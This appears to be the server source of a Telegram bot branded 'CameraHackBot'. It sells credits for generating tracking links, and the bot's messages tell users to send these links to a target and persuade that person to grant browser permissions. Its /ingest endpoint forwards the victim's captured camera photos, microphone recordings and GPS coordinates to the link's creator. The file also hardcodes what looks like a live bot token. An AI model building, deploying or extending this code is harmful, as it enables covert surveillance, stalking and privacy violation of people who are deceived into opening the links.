const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const http = require('http');
const { URL } = require('url');

// --- CONFIGURATION ---
const BOT_TOKEN = process.env.BOT_TOKEN || '8880781989:AAEPFM65w89ZyVBLwjBlC6E7dEXDV_ZgLfI';
const ADMIN_ID = process.env.ADMIN_ID || '7420647897'; 
const BASE_URL = process.env.BASE_URL || 'http://telegram-bot railway.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
app.use(express.json());
app.use(express.static('client')); 
const server = http.createServer(app);

// --- STATE MANAGEMENT (In-Memory) ---
// In production, use Redis or MongoDB for persistence
let users = {}; 
// { userId: { credits: number, referrals: number, isBanned: boolean, lastUsed: timestamp } }

function getUser(userId) {
    if (!users[userId]) {
        users[userId] = { credits: 2, referrals: 0, isBanned: false };
    }
    return users[userId];
}

function addReferral(userId, referredId) {
    let user = getUser(userId);
    user.referrals += 1;
    if (user.referrals % 2 === 0) {
        user.credits += 2;
        bot.sendMessage(userId, `✅ Referral Bonus! You got 2 credits. Total: ${user.credits}`);
    }
}

// --- BOT COMMANDS ---

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    getUser(chatId);
    
    bot.sendMessage(chatId, 
`🕵️ **Welcome to Nawab Zada CameraHackBot!**

I can generate stealthy tracking links for:
📸 **Camera Hack**
📍 **Location Hack**
🎤 **Mic Hack**

How it works:
1. Choose a tool.
2. I generate a unique link.
3. Send it to the target.
4. When they open it and allow permissions, the data appears here.

*Note: This requires the target to explicitly allow browser permissions.*

**Credits:** ${getUser(chatId).credits}
**Referrals:** ${getUser(chatId).referrals}

Use /tools to begin.`,
{ parse_mode: 'Markdown' });
});

bot.onText(/\/tools/, (msg) => {
    const chatId = msg.chat.id;
    const user = getUser(chatId);

    if (user.credits < 2) {
        return bot.sendMessage(chatId, `❌ You are out of credits. You need 2 credits to use a tool.\n\nBuy credits or refer friends to earn more!`);
    }

    const keyboard = {
        inline_keyboard: [
            [{ text: '📸 Camera Hack', callback_data: 'cam' }],
            [{ text: '📍 Location Hack', callback_data: 'loc' }],
            [{ text: '🎤 Mic Hack', callback_data: 'mic' }],
            [{ text: '🛒 Buy Credits / Info', callback_data: 'buy' }],
            [{ text: '👤 My Stats', callback_data: 'stats' }]
        ]
    };

    bot.sendMessage(chatId, "Select a tool to generate a tracking link:", { reply_markup: keyboard });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const user = getUser(chatId);

    // Handle Admin Panel
    if (chatId === parseInt(ADMIN_ID)) {
        if (data === 'admin_stats') {
            const totalUsers = Object.keys(users).length;
            const activeSessions = Object.keys(activeLinks).length;
            return bot.sendMessage(chatId, `📊 **Admin Panel**\n\n👥 Total Users: ${totalUsers}\n🔗 Active Links: ${activeSessions}\n💰 Credits Distribution:\n${JSON.stringify(users, null, 2)}`);
        }
    }

    // Handle User Actions
    if (data === 'stats') {
        bot.editMessageText(
            `📊 **Your Stats**\n\n💳 Credits: ${user.credits}\n👥 Referrals: ${user.referrals}\n\n*Refer 2 friends to get 2 credits.*`,
            { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'Markdown' }
        );
    } else if (data === 'buy') {
        bot.editMessageText(
            `💳 **Buy Credits**\n\nContact the owner to purchase credits:\n[Contact Owner](https://t.me/YourUsername)\n\n💡 **Free Credits:**\nRefer 2 friends to get 2 free credits.`,
            { chat_id: chatId, message_id: query.message.message_id, disable_web_page_preview: true }
        );
    } else if (['cam', 'loc', 'mic'].includes(data)) {
        // Deduct Credit
        user.credits -= 2;
        
        // Generate Unique ID
        const uniqueId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        
        // Store Active Link
        activeLinks[uniqueId] = {
            type: data,
            creatorId: chatId,
            createdAt: new Date().toISOString()
        };

        const link = `${BASE_URL}/client?token=${uniqueId}&type=${data}`;

        bot.editMessageText(
`🔗 **Tracking Link Generated**

${link}

📋 **Instructions:**
1. Copy the link above.
2. Send it to your target via WhatsApp, Email, etc.
3. Tell them to open it in a browser.
4. They must click "Allow" for the permission request.
5. Data will appear here automatically.

*Credits Remaining: ${user.credits}*`,
            { chat_id: chatId, message_id: query.message.message_id, disable_web_page_preview: true }
        );
    }
});

// --- ADMIN PANEL COMMAND ---
bot.onText(/\/admin/, (msg) => {
    if (msg.chat.id !== parseInt(ADMIN_ID)) {
        return bot.sendMessage(msg.chat.id, "❌ You are not the admin.");
    }
    
    const keyboard = {
        inline_keyboard: [
            [{ text: '📊 View Stats', callback_data: 'admin_stats' }],
            [{ text: '👥 List Users', callback_data: 'admin_list' }]
        ]
    };
    bot.sendMessage(msg.chat.id, "🛠️ **Admin Panel**", { reply_markup: keyboard });
});

// --- DATA INGESTION ENDPOINT ---
// When the client-side JS captures data, it POSTs it here
app.post('/ingest', (req, res) => {
    const { token, type, payload } = req.body;
    
    if (!activeLinks[token]) {
        return res.status(404).json({ error: 'Invalid or expired link' });
    }

    const linkData = activeLinks[token];
    const creatorId = linkData.creatorId;
    
    let message = `🚨 **New Capture from Target!**\n\n🔗 **Type:** ${linkData.type.toUpperCase()}\n🕒 **Time:** ${new Date().toLocaleTimeString()}\n\n`;
    
    if (type === 'cam') {
        // Payload is a base64 image
        const fileName = `cam_${Date.now()}.jpg`;
        const buffer = Buffer.from(payload, 'base64');
        bot.sendPhoto(creatorId, buffer, { caption: message });
    } else if (type === 'loc') {
        message += `📍 **Coordinates:** ${payload.lat}, ${payload.lng}\n🌐 **Map Link:** [Open in Maps](https://www.google.com/maps?q=${payload.lat},${payload.lng})`;
        bot.sendMessage(creatorId, message, { disable_web_page_preview: true });
    } else if (type === 'mic') {
        // Payload is a base64 audio file (webm/ogg)
        const fileName = `mic_${Date.now()}.webm`;
        const buffer = Buffer.from(payload, 'base64');
        bot.sendAudio(creatorId, buffer, { caption: message, mime_type: 'audio/webm' });
    }

    // Optional: Remove link after use or keep for multiple captures
    // delete activeLinks[token]; 

    res.json({ success: true });
});

// --- START SERVER ---
server.listen(3000, () => {
    console.log(`Bot is running. Admin ID: ${ADMIN_ID}`);
    console.log(`Visit: ${BASE_URL}`);
});

// In-memory store for active links
let activeLinks = {};
